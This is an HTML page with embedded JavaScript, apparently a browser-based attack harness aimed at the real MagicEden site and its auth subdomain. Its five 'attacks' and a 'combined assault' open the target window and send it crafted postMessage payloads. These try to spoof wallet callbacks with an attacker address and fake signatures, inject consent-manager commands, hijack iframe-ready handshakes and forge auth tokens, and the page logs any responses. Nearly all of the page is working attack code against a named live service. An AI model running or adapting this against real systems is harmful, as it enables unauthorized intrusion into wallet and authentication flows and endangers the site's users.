<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>MagicEden Targeted Attack</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 1200px;
            margin: 20px auto;
            padding: 20px;
            background: #f5f5f5;
        }
        
        h1 {
            color: #333;
            border-bottom: 3px solid #dc3545;
            padding-bottom: 10px;
        }
        
        .warning {
            background: #fff3cd;
            border-left: 4px solid #ffc107;
            padding: 15px;
            margin: 20px 0;
        }
        
        .test-box {
            background: white;
            padding: 20px;
            margin: 15px 0;
            border-radius: 8px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }
        
        .test-box h3 {
            color: #dc3545;
            margin-top: 0;
        }
        
        .code-box {
            background: #f8f9fa;
            padding: 10px;
            border-radius: 4px;
            font-family: monospace;
            font-size: 12px;
            margin: 10px 0;
            border-left: 3px solid #667eea;
        }
        
        button {
            background: #dc3545;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            margin: 5px;
            font-weight: bold;
        }
        
        button:hover {
            background: #c82333;
        }
        
        button.safe {
            background: #28a745;
        }
        
        button.safe:hover {
            background: #218838;
        }
        
        #log {
            background: #1e1e1e;
            color: #0f0;
            padding: 15px;
            border-radius: 5px;
            font-family: monospace;
            font-size: 13px;
            height: 500px;
            overflow-y: auto;
            margin-top: 20px;
        }
        
        .received {
            color: #4ade80;
            font-weight: bold;
        }
        
        .sent {
            color: #60a5fa;
        }
        
        .error {
            color: #f87171;
            font-weight: bold;
        }
        
        .warning-log {
            color: #fbbf24;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <h1>üéØ MagicEden Code-Based Attack Vectors</h1>
    
    <div class="warning">
        <strong>‚ö†Ô∏è Based on the actual MagicEden code listeners:</strong><br>
        Testing exact patterns from listeners #1-9 in the provided code
    </div>
    
    <div class="test-box">
        <h3>Attack 1: Listener Pattern Matching (listeners #1, #2, #3)</h3>
        <div class="code-box">
            Pattern: ({source:e,data:t})=>{e===K&&t===r&&i.length&&i.shift()()}<br>
            Target: Checks if source matches specific value and data matches 'r'
        </div>
        <p>Tries to trigger callbacks by matching source/data patterns</p>
        <button onclick="attack1()">üî• ATTACK 1</button>
    </div>
    
    <div class="test-box">
        <h3>Attack 2: Wallet Origin Bypass (listener #4)</h3>
        <div class="code-box">
            Pattern: if(e.origin!==this.walletOrigin)return;<br>
            Target: Wallet callback handler - tries to spoof walletOrigin
        </div>
        <p>Attempts to bypass wallet origin check and trigger callbacks</p>
        <button onclick="attack2()">üî• ATTACK 2</button>
    </div>
    
    <div class="test-box">
        <h3>Attack 3: Tcf/Osano Command Injection (listener #5)</h3>
        <div class="code-box">
            Pattern: {command:n,parameter:r,version:s,callId:a}<br>
            Target: __tcfapiCall / __cmpCall handlers
        </div>
        <p>Injects commands into consent management platform handlers</p>
        <button onclick="attack3()">üî• ATTACK 3</button>
    </div>
    
    <div class="test-box">
        <h3>Attack 4: Iframe Instance Hijacking (listener #6)</h3>
        <div class="code-box">
            Pattern: a.data==`iframe-ready-${this.instanceId}`<br>
            Target: Iframe initialization - tries to spoof ready message
        </div>
        <p>Attempts to hijack iframe with predictable instance IDs</p>
        <button onclick="attack4()">üî• ATTACK 4</button>
    </div>
    
    <div class="test-box">
        <h3>Attack 5: Auth Frame Bridge (listener #7, #8, #9)</h3>
        <div class="code-box">
            Pattern: auth.magiceden.io frames checking origin === "host"<br>
            Target: WAAS authentication flow
        </div>
        <p>Tests auth frame message handling</p>
        <button onclick="attack5()">üî• ATTACK 5</button>
    </div>
    
    <div class="test-box">
        <h3>üî¥ COMBINED ASSAULT</h3>
        <p>Runs ALL attacks simultaneously with message flooding</p>
        <button onclick="attackAll()" style="font-size: 18px; padding: 15px 30px;">üí£ RUN ALL ATTACKS</button>
    </div>
    
    <div id="log"></div>
    <button onclick="clearLog()" class="safe">Clear Log</button>
    <button onclick="location.reload()" class="safe">Reset Page</button>
    
    <script>
        const TARGET = 'https://magiceden.io';
        const AUTH_TARGET = 'https://auth.magiceden.io';
        const WAIT = 15000;
        let win = null;
        let msgCount = 0;
        
        function log(msg, type = 'sent') {
            const div = document.getElementById('log');
            const time = new Date().toLocaleTimeString();
            div.innerHTML += '<div class="' + type + '">[' + time + '] ' + msg + '</div>';
            div.scrollTop = div.scrollHeight;
            console.log(msg);
        }
        
        function clearLog() {
            document.getElementById('log').innerHTML = '';
            msgCount = 0;
        }
        
        // Global listener
        window.addEventListener('message', function(e) {
            msgCount++;
            log('üì® MSG #' + msgCount + ' FROM: ' + e.origin, 'received');
            log('   DATA: ' + JSON.stringify(e.data).substring(0, 200), 'received');
            
            const str = JSON.stringify(e.data);
            if (str.includes('error') || str.includes('Error')) {
                log('   üö® ERROR IN RESPONSE!', 'error');
            }
            if (str.includes('success') || str.includes('returnValue')) {
                log('   ‚ö° CALLBACK EXECUTED!', 'error');
            }
            if (str.includes('wallet') || str.includes('waas') || str.includes('auth')) {
                log('   üí∞ WALLET/AUTH RELATED!', 'warning-log');
            }
        });
        
        // Attack 1: Source/Data pattern matching
        function attack1() {
            log('=== ATTACK 1: SOURCE/DATA PATTERN ===', 'error');
            win = window.open(TARGET, 'attack1');
            
            setTimeout(function() {
                log('Trying source/data combinations...');
                
                // Try different source values (K, W, eV from code)
                const sources = ['K', 'W', 'eV', 'r', 'source'];
                const dataValues = ['r', 'data', true, 1];
                
                sources.forEach(function(src) {
                    dataValues.forEach(function(dat) {
                        win.postMessage({source: src, data: dat}, '*');
                    });
                });
                
                log('Sent ' + (sources.length * dataValues.length) + ' pattern attempts');
            }, WAIT);
        }
        
        // Attack 2: Wallet callback bypass
        function attack2() {
            log('=== ATTACK 2: WALLET CALLBACK BYPASS ===', 'error');
            win = window.open(TARGET, 'attack2');
            
            setTimeout(function() {
                log('Attempting wallet callback injection...');
                
                // Try to trigger callbacks with IDs
                for (let i = 0; i < 100; i++) {
                    win.postMessage({
                        id: i,
                        returnValue: 'HIJACKED',
                        success: true,
                        wallet: 'attacker_address'
                    }, '*');
                }
                
                // Common wallet callback IDs
                const ids = ['wallet-1', 'connect-1', 'auth-1', 'sign-1', 'tx-1'];
                ids.forEach(function(id) {
                    win.postMessage({
                        id: id,
                        returnValue: {approved: true, signature: 'FAKE'},
                        success: true
                    }, '*');
                });
                
                log('Sent 100+ wallet callback attempts');
            }, WAIT);
        }
        
        // Attack 3: TCF/CMP command injection
        function attack3() {
            log('=== ATTACK 3: TCF/CMP COMMAND INJECTION ===', 'error');
            win = window.open(TARGET, 'attack3');
            
            setTimeout(function() {
                log('Injecting consent management commands...');
                
                // __tcfapiCall pattern
                win.postMessage({
                    __tcfapiCall: {
                        command: 'getVendorConsents',
                        parameter: null,
                        version: 2,
                        callId: 1
                    }
                }, '*');
                
                // __cmpCall pattern
                win.postMessage({
                    __cmpCall: {
                        command: 'getConsentData',
                        parameter: null,
                        callId: 1
                    }
                }, '*');
                
                // Try to get return messages
                win.postMessage({
                    __tcfapiReturn: {
                        returnValue: {consent: true},
                        success: true,
                        callId: 1
                    }
                }, '*');
                
                log('Sent CMP command injections');
            }, WAIT);
        }
        
        // Attack 4: Iframe instance hijacking
        function attack4() {
            log('=== ATTACK 4: IFRAME INSTANCE HIJACK ===', 'error');
            win = window.open(TARGET, 'attack4');
            
            setTimeout(function() {
                log('Trying iframe-ready patterns...');
                
                // Common instance IDs
                const patterns = [
                    'iframe-ready-1',
                    'iframe-ready-default',
                    'iframe-ready-main',
                    'iframe-ready-0',
                    'iframe-ready-wallet',
                    'iframe-ready-auth'
                ];
                
                // Also try timestamp-based
                for (let i = 0; i < 20; i++) {
                    patterns.push('iframe-ready-' + (Date.now() - i * 1000));
                }
                
                patterns.forEach(function(p) {
                    win.postMessage(p, '*');
                });
                
                log('Sent ' + patterns.length + ' iframe-ready attempts');
            }, WAIT);
        }
        
        // Attack 5: Auth frame bridge
        function attack5() {
            log('=== ATTACK 5: AUTH FRAME BRIDGE ===', 'error');
            win = window.open(TARGET, 'attack5');
            
            setTimeout(function() {
                log('Testing auth frame messages...');
                
                // Pattern from listener #9: origin === "host"
                win.postMessage({
                    origin: 'host',
                    type: 'text',
                    text: 'malicious'
                }, '*');
                
                // WAAS patterns from auth.magiceden.io
                win.postMessage({
                    waasCall: {
                        command: 'authenticate',
                        parameter: {user: 'attacker'},
                        version: '1.0',
                        callId: '123'
                    }
                }, '*');
                
                win.postMessage({
                    waasReturn: {
                        returnValue: {token: 'FAKE_TOKEN'},
                        success: true,
                        callId: '1'
                    }
                }, '*');
                
                log('Sent auth frame messages');
            }, WAIT);
        }
        
        // Combined attack
        function attackAll() {
            log('=== üí£ COMBINED ASSAULT INITIATED ===', 'error');
            log('Opening target...', 'error');
            
            win = window.open(TARGET, 'combined');
            
            setTimeout(function() {
                log('LAUNCHING ALL ATTACKS...', 'error');
                
                // Rapid-fire all patterns
                let totalSent = 0;
                
                // Attack 1 patterns
                ['K', 'W', 'eV'].forEach(function(s) {
                    ['r', true].forEach(function(d) {
                        win.postMessage({source: s, data: d}, '*');
                        totalSent++;
                    });
                });
                
                // Attack 2 - callbacks
                for (let i = 0; i < 50; i++) {
                    win.postMessage({id: i, returnValue: 'HIJACK', success: true}, '*');
                    totalSent++;
                }
                
                // Attack 3 - CMP
                win.postMessage({__tcfapiCall: {command: 'test', callId: 1}}, '*');
                win.postMessage({__cmpCall: {command: 'test', callId: 1}}, '*');
                totalSent += 2;
                
                // Attack 4 - iframe ready
                for (let i = 0; i < 10; i++) {
                    win.postMessage('iframe-ready-' + i, '*');
                    totalSent++;
                }
                
                // Attack 5 - auth
                win.postMessage({origin: 'host', type: 'command'}, '*');
                win.postMessage({waasCall: {command: 'test'}}, '*');
                totalSent += 2;
                
                log('üî• SENT ' + totalSent + ' MALICIOUS MESSAGES', 'error');
                log('Watch for responses...', 'warning-log');
            }, WAIT);
        }
        
        log('üíÄ ATTACK SUITE READY');
        log('‚ö†Ô∏è Testing actual code patterns from MagicEden');
        log('Click an attack button to begin');
    </script>
</body>
</html>
